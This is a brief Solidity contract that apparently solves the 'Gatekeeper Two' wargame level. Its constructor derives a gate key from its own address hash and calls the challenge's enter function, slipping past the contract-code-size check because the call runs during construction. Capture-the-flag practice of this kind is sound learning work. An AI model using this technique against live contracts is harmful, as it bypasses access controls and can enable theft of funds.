// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwoAttack {

    constructor(address challengeAddress) {
        uint64 _gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _gateKey);
        (bool success,) = challengeAddress.call(payload);
        require(success);
    }
}


